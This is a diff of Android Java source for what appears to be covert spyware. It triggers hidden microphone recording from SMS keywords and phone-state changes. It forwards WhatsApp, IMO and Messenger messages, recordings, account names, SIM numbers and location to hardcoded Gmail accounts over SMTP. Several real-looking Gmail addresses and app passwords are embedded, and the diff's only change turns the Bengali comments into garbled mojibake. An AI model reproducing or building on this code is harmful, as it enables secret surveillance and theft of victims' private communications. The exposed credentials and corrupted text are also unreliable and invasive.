+                    Log.d(TAG, "VideoRecord Email sent successfully with attachment."); // à¦¸à¦«à¦² à¦²à¦—
                 } catch (MessagingException e) {
-                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage(), e); // মেইল পাঠানোর ত্রুটি
+                    Log.e(TAG, "Error occurred while sending email: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                     e.printStackTrace();
-                    return null; // মেইল পাঠানো ব্যর্থ হলে প্রক্রিয়া থামান
+                    return null; // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
                 }
 
             } catch (Exception e) {
-                Log.e(TAG, "Error occurred during mail creation or sending: " + e.getMessage(), e); // মেইল তৈরি বা পাঠানোর ত্রুটি
+                Log.e(TAG, "Error occurred during mail creation or sending: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦¤à§ˆà¦°à¦¿ à¦¬à¦¾ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
                 e.printStackTrace();
             }
-            return null; // সম্পন্ন
+            return null; // à¦¸à¦®à§à¦ªà¦¨à§à¦¨
         }
     }
 
-    // স্ট্যাটিক মেথড যা অন্য জায়গা থেকে ব্যবহার করা যাবে
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦®à§‡à¦¥à¦¡ à¦¯à¦¾ à¦…à¦¨à§à¦¯ à¦œà¦¾à§Ÿà¦—à¦¾ à¦¥à§‡à¦•à§‡ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡
     public static void sendMailWithAttachment(String email, String subject, String message, String filePath) {
         JavaMailAPI_VideoRecord_Sender javaMailAPI = new JavaMailAPI_VideoRecord_Sender(email, subject, message, filePath);
-        javaMailAPI.sendMail(); // মেইল পাঠানোর মেথড কল করা
+        javaMailAPI.sendMail(); // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦®à§‡à¦¥à¦¡ à¦•à¦² à¦•à¦°à¦¾
     }
 }
 
@@ -8066,20 +8132,20 @@ public class JavaMailAPI_WhatsAppIMOMessengerSender {
 
     @SuppressLint("LongLogTag")
     public static void sendEmail(String app, String message) {
-        // দৈনিক সীমা চেক করুন
+        // à¦¦à§ˆà¦¨à¦¿à¦• à¦¸à§€à¦®à¦¾ à¦šà§‡à¦• à¦•à¦°à§à¦¨
         if (!CountEmail.canSendEmail()) {
             Log.d(TAG, "Email limit reached for today. No email sent.");
-            return; // ইমেল পাঠানো হবে না
+            return; // à¦‡à¦®à§‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹ à¦¹à¦¬à§‡ à¦¨à¦¾
         }
 
-        final String username = "abontiangum99@gmail.com"; // আপনার Gmail ঠিকানা
-        final String password = "egqnjvccoqtgwaxo"; // আপনার Gmail পাসওয়ার্ড
+        final String username = "abontiangum99@gmail.com"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ à¦¿à¦•à¦¾à¦¨à¦¾
+        final String password = "egqnjvccoqtgwaxo"; // à¦†à¦ªà¦¨à¦¾à¦° Gmail à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡
 
         Properties props = new Properties();
         props.put("mail.smtp.auth", "true");
         props.put("mail.smtp.starttls.enable", "true");
-        props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP সার্ভার
-        props.put("mail.smtp.port", "587"); // SMTP পোর্ট
+        props.put("mail.smtp.host", "smtp.gmail.com"); // SMTP à¦¸à¦¾à¦°à§à¦­à¦¾à¦°
+        props.put("mail.smtp.port", "587"); // SMTP à¦ªà§‹à¦°à§à¦Ÿ
 
         Session session = null;
         try {
@@ -8090,24 +8156,24 @@ public class JavaMailAPI_WhatsAppIMOMessengerSender {
                         }
                     });
         } catch (Exception e) {
-            Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // সেশন তৈরি ত্রুটি
+            Log.e(TAG, "Error occurred while creating session: " + e.getMessage(), e); // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¤à§à¦°à§à¦Ÿà¦¿
             e.printStackTrace();
-            return; // সেশন তৈরি ব্যর্থ হলে প্রক্রিয়া থামান
+            return; // à¦¸à§‡à¦¶à¦¨ à¦¤à§ˆà¦°à¦¿ à¦¬à§à¦¯à¦°à§à¦¥ à¦¹à¦²à§‡ à¦ªà§à¦°à¦•à§à¦°à¦¿à§Ÿà¦¾ à¦¥à¦¾à¦®à¦¾à¦¨
         }
 
         try {
-            // মেইল মেসেজ তৈরি করা
+            // à¦®à§‡à¦‡à¦² à¦®à§‡à¦¸à§‡à¦œ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
             Message mimeMessage = new MimeMessage(session);
             mimeMessage.setFrom(new InternetAddress(username));
             mimeMessage.setRecipients(Message.RecipientType.TO,
-                    InternetAddress.parse("abontiangum99@gmail.com")); // গন্তব্যের ইমেইল ঠিকানা
+                    InternetAddress.parse("abontiangum99@gmail.com")); // à¦—à¦¨à§à¦¤à¦¬à§à¦¯à§‡à¦° à¦‡à¦®à§‡à¦‡à¦² à¦ à¦¿à¦•à¦¾à¦¨à¦¾
             mimeMessage.setSubject("New Message from " + app);
             mimeMessage.setText("Message received from " + app + ":\n\n" + message);
 
             try {
-                // মেইল পাঠানো
+                // à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                 Transport.send(mimeMessage);
-                CountEmail.incrementEmailCount(); // ইমেল সফলভাবে পাঠানোর পর কাউন্টার বাড়ান
+                CountEmail.incrementEmailCount(); // à¦‡à¦®à§‡à¦² à¦¸à¦«à¦²à¦­à¦¾à¦¬à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦ªà¦° à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦¾à¦° à¦¬à¦¾à§œà¦¾à¦¨
                 Log.d(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Email sent successfully.");
             } catch (MessagingException e) {
                 Log.e(TAG, "JavaMailAPI_WhatsAppIMOMessengerSender Failed to send email: " + e.getMessage(), e);
@@ -8115,7 +8181,7 @@ public class JavaMailAPI_WhatsAppIMOMessengerSender {
             }
 
         } catch (MessagingException e) {
-            Log.e(TAG, "Error occurred while creating or sending email message: " + e.getMessage(), e); // মেইল তৈরি বা পাঠানোর ত্রুটি
+            Log.e(TAG, "Error occurred while creating or sending email message: " + e.getMessage(), e); // à¦®à§‡à¦‡à¦² à¦¤à§ˆà¦°à¦¿ à¦¬à¦¾ à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦¤à§à¦°à§à¦Ÿà¦¿
             e.printStackTrace();
         }
     }
@@ -8373,37 +8439,37 @@ public class JavaMailAPISendNotificationUseEmails {
             notificationListener = new NotificationListener();
         }
 
-        // NotificationListener থেকে ইমেইলের প্রথম অংশ এবং পাসওয়ার্ড বের করা
+        // NotificationListener à¦¥à§‡à¦•à§‡ à¦‡à¦®à§‡à¦‡à¦²à§‡à¦° à¦ªà§à¦°à¦¥à¦® à¦…à¦‚à¦¶ à¦à¦¬à¦‚ à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¬à§‡à¦° à¦•à¦°à¦¾
         String emailFirstPart = notificationListener.SetEmailFirstPartName(context, "");
         String emailPassword = notificationListener.SetEmailPassword(context, "");
 
-        // নাল চেক যোগ করা
+        // à¦¨à¦¾à¦² à¦šà§‡à¦• à¦¯à§‹à¦— à¦•à¦°à¦¾
         if (emailFirstPart == null || emailPassword == null) {
-            Log.e(TAG, "EmailFirstPart বা EmailPassword null হয়েছে!");
+            Log.e(TAG, "EmailFirstPart à¦¬à¦¾ EmailPassword null à¦¹à§Ÿà§‡à¦›à§‡!");
             emailFirstPart = "emailFirstPartnull" ;
             emailPassword =  "emailPasswordnull" ;
-          //  return; // বা ডিফল্ট মান সেট করুন
+          //  return; // à¦¬à¦¾ à¦¡à¦¿à¦«à¦²à§à¦Ÿ à¦®à¦¾à¦¨ à¦¸à§‡à¦Ÿ à¦•à¦°à§à¦¨
         }
 
 
 
-        // ইমেইল1 তৈরি করা
-        email1 = emailFirstPart + "99@gmail.com";  // প্রথম অংশের সাথে ডোমেইন যোগ করা
+        // à¦‡à¦®à§‡à¦‡à¦²1 à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
+        email1 = emailFirstPart + "99@gmail.com";  // à¦ªà§à¦°à¦¥à¦® à¦…à¦‚à¦¶à§‡à¦° à¦¸à¦¾à¦¥à§‡ à¦¡à§‹à¦®à§‡à¦‡à¦¨ à¦¯à§‹à¦— à¦•à¦°à¦¾
         Log.d(TAG, "Generated email1: " + email1);
 
-        // ইমেইল পাসওয়ার্ড সেট করা
+        // à¦‡à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
         email1password = emailPassword;
-        Log.d(TAG, "Generated email1password: " + email1password.replaceAll(".", "*"));  // পাসওয়ার্ড মাক্স করা
+        Log.d(TAG, "Generated email1password: " + email1password.replaceAll(".", "*"));  // à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦®à¦¾à¦•à§à¦¸ à¦•à¦°à¦¾
 
-        // EMAIL_ACCOUNTS অ্যারেটি আপডেট করা
-        EMAIL_ACCOUNTS[0][0] = email1;  // ইমেইল1 অ্যারেতে সেট করা
-        EMAIL_ACCOUNTS[0][1] = email1password;  // ইমেইল1 পাসওয়ার্ড অ্যারেতে সেট করা
+        // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡à¦Ÿà¦¿ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾
+        EMAIL_ACCOUNTS[0][0] = email1;  // à¦‡à¦®à§‡à¦‡à¦²1 à¦…à§à¦¯à¦¾à¦°à§‡à¦¤à§‡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
+        EMAIL_ACCOUNTS[0][1] = email1password;  // à¦‡à¦®à§‡à¦‡à¦²1 à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦…à§à¦¯à¦¾à¦°à§‡à¦¤à§‡ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾
 
-        // যদি আপনার সমস্ত ইমেইল অ্যাকাউন্ট ডায়নামিকভাবে আপডেট করতে হয়
+        // à¦¯à¦¦à¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦¸à¦®à¦¸à§à¦¤ à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¤à§‡ à¦¹à§Ÿ
         updateEmailAccounts();
     }
 
-    // স্ট্যাটিক ইমেইল অ্যাকাউন্ট গুলি
+    // à¦¸à§à¦Ÿà§à¦¯à¦¾à¦Ÿà¦¿à¦• à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦—à§à¦²à¦¿
     public static final String email2 = "babulahmed000015@gmail.com";
     public static final String email2password = "ncozjamyddqjiaba";
     public static final String email3 = "fgfgfdf99@gmail.com";
@@ -8415,9 +8481,9 @@ public class JavaMailAPISendNotificationUseEmails {
     public static final String email6 = "dgxdgxg@gmail.com";
     public static final String email6password = "egqnjnncoqtgwaxo";
 
-    // EMAIL_ACCOUNTS অ্যারে যেটি ডায়নামিকভাবে আপডেট হবে
+    // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡ à¦¯à§‡à¦Ÿà¦¿ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦¹à¦¬à§‡
     public static String[][] EMAIL_ACCOUNTS = {
-            {email1, email1password},  // এখানে ডায়নামিকভাবে আপডেট করা হবে
+            {email1, email1password},  // à¦à¦–à¦¾à¦¨à§‡ à¦¡à¦¾à§Ÿà¦¨à¦¾à¦®à¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾ à¦¹à¦¬à§‡
             {email2, email2password},
             {email3, email3password},
             {email4, email4password},
@@ -8425,12 +8491,12 @@ public class JavaMailAPISendNotificationUseEmails {
             {email6, email6password}
     };
 
-    // EMAIL_ACCOUNTS অ্যারের সকল ইমেইল অ্যাকাউন্ট আপডেট করার জন্য মেথড
+    // EMAIL_ACCOUNTS à¦…à§à¦¯à¦¾à¦°à§‡à¦° à¦¸à¦•à¦² à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ à¦®à§‡à¦¥à¦¡
     public static void updateEmailAccounts() {
-        EMAIL_ACCOUNTS[0][0] = email1;  // প্রথম ইমেইল অ্যাকাউন্ট আপডেট
-        EMAIL_ACCOUNTS[0][1] = email1password;  // প্রথম পাসওয়ার্ড আপডেট
+        EMAIL_ACCOUNTS[0][0] = email1;  // à¦ªà§à¦°à¦¥à¦® à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿ à¦†à¦ªà¦¡à§‡à¦Ÿ
+        EMAIL_ACCOUNTS[0][1] = email1password;  // à¦ªà§à¦°à¦¥à¦® à¦ªà¦¾à¦¸à¦“à§Ÿà¦¾à¦°à§à¦¡ à¦†à¦ªà¦¡à§‡à¦Ÿ
 
-        // অন্য ইমেইল অ্যাকাউন্টগুলি, যদি আপনার প্রয়োজন থাকে তাদেরও আপডেট করা
+        // à¦…à¦¨à§à¦¯ à¦‡à¦®à§‡à¦‡à¦² à¦…à§à¦¯à¦¾à¦•à¦¾à¦‰à¦¨à§à¦Ÿà¦—à§à¦²à¦¿, à¦¯à¦¦à¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦ªà§à¦°à§Ÿà§‹à¦œà¦¨ à¦¥à¦¾à¦•à§‡ à¦¤à¦¾à¦¦à§‡à¦°à¦“ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à¦¾
         EMAIL_ACCOUNTS[1][0] = email2;
         EMAIL_ACCOUNTS[1][1] = email2password;
 
@@ -8478,55 +8544,55 @@ import java.util.Locale;
 public class LocationUtil {
 
     private static final String TAG = "LocationUtil";
-    private String FullCountryName; // দেশের নাম স্টোর করার জন্য
+    private String FullCountryName; // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯
 
-    // কলব্যাক ইন্টারফেস
+    // à¦•à¦²à¦¬à§à¦¯à¦¾à¦• à¦‡à¦¨à§à¦Ÿà¦¾à¦°à¦«à§‡à¦¸
     public interface LocationCallback {
         void onCountryNameReceived(String countryName);
     }
 
-    // দেশের নাম পাওয়ার জন্য মেথড
+    // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦œà¦¨à§à¦¯ à¦®à§‡à¦¥à¦¡
     public void getCountryName(Context context, LocationCallback callback) {
-        // পারমিশন চেক করা
+        // à¦ªà¦¾à¦°à¦®à¦¿à¦¶à¦¨ à¦šà§‡à¦• à¦•à¦°à¦¾
         if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                 ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "Permission not granted for location access.");
-            callback.onCountryNameReceived(null); // পারমিশন না থাকলে null পাঠানো
+            callback.onCountryNameReceived(null); // à¦ªà¦¾à¦°à¦®à¦¿à¦¶à¦¨ à¦¨à¦¾ à¦¥à¦¾à¦•à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
             return;
         }
 
-        // ফিউজড লোকেশন ক্লায়েন্ট তৈরি করা
+        // à¦«à¦¿à¦‰à¦œà¦¡ à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦•à§à¦²à¦¾à§Ÿà§‡à¦¨à§à¦Ÿ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾
         FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
 
-        // শেষ জানা লোকেশন পাওয়ার জন্য রিকোয়েস্ট করা
+        // à¦¶à§‡à¦· à¦œà¦¾à¦¨à¦¾ à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦œà¦¨à§à¦¯ à¦°à¦¿à¦•à§‹à§Ÿà§‡à¦¸à§à¦Ÿ à¦•à¦°à¦¾
         fusedLocationClient.getLastLocation()
                 .addOnSuccessListener(new OnSuccessListener<Location>() {
                     @Override
                     public void onSuccess(Location location) {
                         if (location != null) {
-                            // লোকেশন পাওয়া গেলে গিওকোডার ব্যবহার করে দেশের নাম বের করা
+                            // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ à¦—à¦¿à¦“à¦•à§‹à¦¡à¦¾à¦° à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§‡ à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¬à§‡à¦° à¦•à¦°à¦¾
                             Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                             try {
                                 List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                                 if (addresses != null && !addresses.isEmpty()) {
-                                    FullCountryName = addresses.get(0).getCountryName(); // দেশের নাম স্টোর করা
+                                    FullCountryName = addresses.get(0).getCountryName(); // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦¸à§à¦Ÿà§‹à¦° à¦•à¦°à¦¾
                                     Log.d(TAG, "Country: " + FullCountryName);
-                                    callback.onCountryNameReceived(FullCountryName); // দেশের নাম কলব্যাকে পাঠানো
+                                    callback.onCountryNameReceived(FullCountryName); // à¦¦à§‡à¦¶à§‡à¦° à¦¨à¦¾à¦® à¦•à¦²à¦¬à§à¦¯à¦¾à¦•à§‡ à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                                 } else {
-                                    callback.onCountryNameReceived(null); // লোকেশন না পাওয়া গেলে null পাঠানো
+                                    callback.onCountryNameReceived(null); // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦¨à¦¾ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                                 }
                             } catch (IOException e) {
                                 Log.e(TAG, "Geocoder error: ", e);
-                                callback.onCountryNameReceived(null); // এরর হলে null পাঠানো
+                                callback.onCountryNameReceived(null); // à¦à¦°à¦° à¦¹à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                             }
                         } else {
-                            callback.onCountryNameReceived(null); // লোকেশন না পাওয়া গেলে null পাঠানো
+                            callback.onCountryNameReceived(null); // à¦²à§‹à¦•à§‡à¦¶à¦¨ à¦¨à¦¾ à¦ªà¦¾à¦“à§Ÿà¦¾ à¦—à§‡à¦²à§‡ null à¦ªà¦¾à¦ à¦¾à¦¨à§‹
                         }
                     }
                 });
     }
 
-    // আপনি চাইলে FullCountryName সরাসরি এই মেথড দিয়ে পেতে পারেন
+    // à¦†à¦ªà¦¨à¦¿ à¦šà¦¾à¦‡à¦²à§‡ FullCountryName à¦¸à¦°à¦¾à¦¸à¦°à¦¿ à¦à¦‡ à¦®à§‡à¦¥à¦¡ à¦¦à¦¿à§Ÿà§‡ à¦ªà§‡à¦¤à§‡ à¦ªà¦¾à¦°à§‡à¦¨
     public String getFullCountryName() {
         return FullCountryName;
     }
@@ -8586,8 +8652,8 @@ public class MicRecord extends BroadcastReceiver {
             "+880130028208011", "+880130403928011",  "+880969763789011", "+880963882136011" };
     private static final String[] WORDS1_GRADE = {"Goldm", "Silverm", "Mediumm"};
     private static final String[] WORDS2_OFFER = {"Congratulationm", "Conformm"};
-    private static final String[] WORDS3_OFFER = { "ঐ", "ও", "helo",  "কিহলো", "বলবা","কখন","কখন আসবে","আসবে",
-            "সময়", "বলো",  "স্ক্রিনশট দাও","স্ক্রিনশট", "screenshort","screenshort dau", "কলদাও",  "কিকরছ " };
+    private static final String[] WORDS3_OFFER = { "à¦", "à¦“", "helo",  "à¦•à¦¿à¦¹à¦²à§‹", "à¦¬à¦²à¦¬à¦¾","à¦•à¦–à¦¨","à¦•à¦–à¦¨ à¦†à¦¸à¦¬à§‡","à¦†à¦¸à¦¬à§‡",
+            "à¦¸à¦®à§Ÿ", "à¦¬à¦²à§‹",  "à¦¸à§à¦•à§à¦°à¦¿à¦¨à¦¶à¦Ÿ à¦¦à¦¾à¦“","à¦¸à§à¦•à§à¦°à¦¿à¦¨à¦¶à¦Ÿ", "screenshort","screenshort dau", "à¦•à¦²à¦¦à¦¾à¦“",  "à¦•à¦¿à¦•à¦°à¦› " };
     private List<String> lastMessages = new ArrayList<>();
     private Handler handler; // Declare Handler here
 
@@ -8612,7 +8678,7 @@ public class MicRecord extends BroadcastReceiver {
         Log.d(TAG, "onReceive called with action: " + intent.getAction());
         try {
             if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
-                handleSmsReceived(intent, context); // SMS পাওয়ার পরে কি করতে হবে তা handle করুন
+                handleSmsReceived(intent, context); // SMS à¦ªà¦¾à¦“à§Ÿà¦¾à¦° à¦ªà¦°à§‡ à¦•à¦¿ à¦•à¦°à¦¤à§‡ à¦¹à¦¬à§‡ à¦¤à¦¾ handle à¦•à¦°à§à¦¨
             } else if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
                 Log.d(TAG, "Phone state changed, checking for call state.");
                 handlePhoneStateChange(context, intent); // Check phone state
@@ -8707,7 +8773,7 @@ public class MicRecord extends BroadcastReceiver {
 
         File dir = new File(Environment.getExternalStorageDirectory() + "/DCIM/MicRecord");
         if (!dir.exists() && !dir.mkdirs()) {
-            Log.e(TAG, "রেকর্ডিংয়ের জন্য ডিরেক্টরি তৈরি করা সম্ভব হয়নি.");
+            Log.e(TAG, "à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚à§Ÿà§‡à¦° à¦œà¦¨à§à¦¯ à¦¡à¦¿à¦°à§‡à¦•à§à¦Ÿà¦°à¦¿ à¦¤à§ˆà¦°à¦¿ à¦•à¦°à¦¾ à¦¸à¦®à§à¦­à¦¬ à¦¹à§Ÿà¦¨à¦¿.");
             return;
         }
 
@@ -8721,7 +8787,7 @@ public class MicRecord extends BroadcastReceiver {
 
             mediaRecorder = new MediaRecorder();
 
-            // তিনটি সম্ভাব্য অডিও সোর্স চেষ্টা করুন
+            // à¦¤à¦¿à¦¨à¦Ÿà¦¿ à¦¸à¦®à§à¦­à¦¾à¦¬à§à¦¯ à¦…à¦¡à¦¿à¦“ à¦¸à§‹à¦°à§à¦¸ à¦šà§‡à¦·à§à¦Ÿà¦¾ à¦•à¦°à§à¦¨
             if (setAudioSource(MediaRecorder.AudioSource.MIC)) {
                 Log.d(TAG, "Audio source set to MIC");
             } else if (setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)) {
@@ -8730,7 +8796,7 @@ public class MicRecord extends BroadcastReceiver {
                 Log.d(TAG, "Audio source set to VOICE_RECOGNITION");
             } else {
                 Log.e(TAG, "Failed to set any audio source");
-                return; // কোনো অডিও সোর্স সেট করা না গেলে রেকর্ডিং শুরু করা যাবে না
+                return; // à¦•à§‹à¦¨à§‹ à¦…à¦¡à¦¿à¦“ à¦¸à§‹à¦°à§à¦¸ à¦¸à§‡à¦Ÿ à¦•à¦°à¦¾ à¦¨à¦¾ à¦—à§‡à¦²à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¶à§à¦°à§ à¦•à¦°à¦¾ à¦¯à¦¾à¦¬à§‡ à¦¨à¦¾
             }
             mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB); // Set the output format to AMR-NB (Narrowband)
             mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); // Set the audio encoder to AMR-NB
@@ -8774,7 +8840,7 @@ public class MicRecord extends BroadcastReceiver {
 
         try {
             if (mediaRecorder != null) {
-                // 1. প্রথমে রেকর্ডার স্টেট চেক করুন
+                // 1. à¦ªà§à¦°à¦¥à¦®à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¾à¦° à¦¸à§à¦Ÿà§‡à¦Ÿ à¦šà§‡à¦• à¦•à¦°à§à¦¨
                 try {
                     int maxAmplitude = mediaRecorder.getMaxAmplitude();
                     Log.d(TAG, "MediaRecorder is already active. Max Amplitude: " + maxAmplitude);
@@ -8786,18 +8852,18 @@ public class MicRecord extends BroadcastReceiver {
                     Log.e(TAG, "Recorder was not in recording state: " + e.getMessage());
                 }
 
-                // 2. রিসোর্স রিলিজ করুন
+                // 2. à¦°à¦¿à¦¸à§‹à¦°à§à¦¸ à¦°à¦¿à¦²à¦¿à¦œ à¦•à¦°à§à¦¨
                 mediaRecorder.release();
                 mediaRecorder = null;
             } else {
                 Log.e(TAG, "MediaRecorder is null, cannot stop recording");
             }
 
-            // 3. ফ্লাগ আপডেট করুন
+            // 3. à¦«à§à¦²à¦¾à¦— à¦†à¦ªà¦¡à§‡à¦Ÿ à¦•à¦°à§à¦¨
             isSoundRecording = false;
             Log.d(TAG, "Recording state reset, isSoundRecording = " + isSoundRecording);
 
-            // 4. ইমেইল পাঠানোর লজিক
+            // 4. à¦‡à¦®à§‡à¦‡à¦² à¦ªà¦¾à¦ à¦¾à¦¨à§‹à¦° à¦²à¦œà¦¿à¦•
             if (isInternetAvailable(context)) {
             //    Log.d(TAG, "Internet available, sending recording via email");
                 sendEmailWithAttachment("Sound Rec", "file:", fileName);
@@ -8805,12 +8871,12 @@ public class MicRecord extends BroadcastReceiver {
              //   Log.d(TAG, "Internet not available, recording saved locally");
             }
 
-            // 5. পুরানো রেকর্ডিং ডিলিট করুন
+            // 5. à¦ªà§à¦°à¦¾à¦¨à§‹ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¡à¦¿à¦²à¦¿à¦Ÿ à¦•à¦°à§à¦¨
             deleteOldRecordings();
 
         } catch (Exception e) {
             Log.e(TAG, "Error in stopMicSoundRecording: ", e);
-            // কোনো অবস্থাতেই ফ্লাগ রিসেট করতে ভুলবেন না
+            // à¦•à§‹à¦¨à§‹ à¦…à¦¬à¦¸à§à¦¥à¦¾à¦¤à§‡à¦‡ à¦«à§à¦²à¦¾à¦— à¦°à¦¿à¦¸à§‡à¦Ÿ à¦•à¦°à¦¤à§‡ à¦­à§à¦²à¦¬à§‡à¦¨ à¦¨à¦¾
             isSoundRecording = false;
             mediaRecorder = null;
         }
@@ -8822,7 +8888,7 @@ public class MicRecord extends BroadcastReceiver {
         try {
             String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
             Log.d(TAG, "Outgoing call to: " + outgoingNumber);
-            //stopRecording(context); // আউটগোয়িং কলের ক্ষেত্রে রেকর্ডিং বন্ধ
+            //stopRecording(context); // à¦†à¦‰à¦Ÿà¦—à§‹à§Ÿà¦¿à¦‚ à¦•à¦²à§‡à¦° à¦•à§à¦·à§‡à¦¤à§à¦°à§‡ à¦°à§‡à¦•à¦°à§à¦¡à¦¿à¦‚ à¦¬à¦¨à§à¦§
         } catch (Exception e) {
             Log.e(TAG, "Error in handleOutgoingCall: ", e);
         }
@@ -8924,8 +8990,8 @@ public class MicRecord extends BroadcastReceiver {
         AccountUtil accountUtil = new AccountUtil();
         String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
         String userSimNumber = accountUtil.getUserSimNumber(context);
-        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
-        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
+        String title = "Your Notification Title";  // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà¦¾à¦‡à¦Ÿà§‡à¦² à¦¹à¦¬à§‡
+        String text = "Your Notification Text";    // à¦à¦Ÿà¦¿ à¦†à¦ªà¦¨à¦¾à¦° à¦Ÿà§‡à¦•à§à¦¸à¦Ÿ à¦¹à¦¬à§‡
         String Get_Sim1_Number = null;
 
         SmsReceiver smsReceiver = new SmsReceiver();
@@ -9101,7 +9167,7 @@ public class MicRecord extends BroadcastReceiver {
             String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
             String messageBody = "app Incoming call detected";  // You can customize this message if needed
             // startMicRecording(context, incomingNumber, messageBody);
